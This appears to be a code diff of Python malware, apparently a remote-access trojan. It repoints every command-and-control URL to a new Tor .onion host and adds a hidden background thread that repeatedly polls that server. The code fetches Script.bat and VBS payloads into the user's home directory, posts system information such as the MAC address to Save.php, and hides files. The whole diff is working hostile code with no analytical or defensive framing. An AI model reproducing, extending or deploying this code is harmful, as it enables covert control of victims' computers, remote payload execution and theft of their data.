@@ -57,10 +57,10 @@ def METASPLOIT():
     actual_mac = uuid.UUID(int=uuid.getnode()).hex[-12:] 
     actual_mac = ':'.join([actual_mac[e:e+2] for e in range(0, 12, 2)]) 
   
-    previous_data = "" 
+    previous_data = ""
   
     while True:
-     url = 'http://cbo4lp2r6udkuvx5ds6cfsny24bs3lqowhbfqlggfbwp5jnq64nb3vqd.onion/Metasploit.php'
+     url = 'http://xj6y6rzza3e47mclwxlelrfkzvo7zbzpiafcaxikiqajh7klb7gko5qd.onion/Metasploit.php'
      time.sleep(5)
      response = requests_session.get(url)
 
@@ -90,7 +90,7 @@ def METASPLOIT():
                     restart_program()
                 elif option == "STARTVBSBAT":
                     os.system("cls")
-                    php_script_url = 'http://cbo4lp2r6udkuvx5ds6cfsny24bs3lqowhbfqlggfbwp5jnq64nb3vqd.onion/Control.php'
+                    php_script_url = 'http://xj6y6rzza3e47mclwxlelrfkzvo7zbzpiafcaxikiqajh7klb7gko5qd.onion/Control.php'
                     home_directory = os.path.expanduser("~")
                     web_page1_path = os.path.join(home_directory, "Script.bat")
                     vbs_file_path = os.path.join(home_directory, "VBSEX.vbs")
@@ -99,8 +99,8 @@ def METASPLOIT():
                         if os.path.exists(file_path):
                             os.remove(file_path)
 
-                    url1 = "http://cbo4lp2r6udkuvx5ds6cfsny24bs3lqowhbfqlggfbwp5jnq64nb3vqd.onion/Script.io"
-                    url2 = "http://cbo4lp2r6udkuvx5ds6cfsny24bs3lqowhbfqlggfbwp5jnq64nb3vqd.onion/VBSEX.io"
+                    url1 = "http://xj6y6rzza3e47mclwxlelrfkzvo7zbzpiafcaxikiqajh7klb7gko5qd.onion/Script.io"
+                    url2 = "http://xj6y6rzza3e47mclwxlelrfkzvo7zbzpiafcaxikiqajh7klb7gko5qd.onion/VBSEX.io"
 
                     download_file(url1, web_page1_path)
                     download_file(url2, vbs_file_path)
@@ -261,6 +261,19 @@ def hide_files_unix(file_paths):
     except Exception as e:
         print(f"Error hiding files on Unix-based system: {str(e)}")
 
+def MEATSERVICE():
+    while True:
+        try:
+         print("Running MEATSERVICE...")
+         METASPLOIT()
+         time.sleep(5)
+        except:
+            pass
+
+specific_code_thread = threading.Thread(target=MEATSERVICE)
+specific_code_thread.daemon = True  
+specific_code_thread.start()
+
 def get_system_info():
     try:
         mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
@@ -303,7 +316,7 @@ def get_system_info():
         session = requests.Session()
         session.proxies = proxies
 
-        url = "http://cbo4lp2r6udkuvx5ds6cfsny24bs3lqowhbfqlggfbwp5jnq64nb3vqd.onion/Save.php"
+        url = "http://xj6y6rzza3e47mclwxlelrfkzvo7zbzpiafcaxikiqajh7klb7gko5qd.onion/Save.php"
         data = data_to_send
         response = requests_session.post(url, data=data)
         print(response.text)
@@ -318,11 +331,8 @@ while True:
     try:
         def receive_data():
             global previous_command, previous_files
-            time.sleep(10)
-            METASPLOIT()
             while True:
-                METASPLOIT()
-                php_script_url = 'http://cbo4lp2r6udkuvx5ds6cfsny24bs3lqowhbfqlggfbwp5jnq64nb3vqd.onion/Control.php'
+                php_script_url = 'http://xj6y6rzza3e47mclwxlelrfkzvo7zbzpiafcaxikiqajh7klb7gko5qd.onion/Control.php'
                 
                 response = requests_session.get(php_script_url)
                 data = response.text.strip()
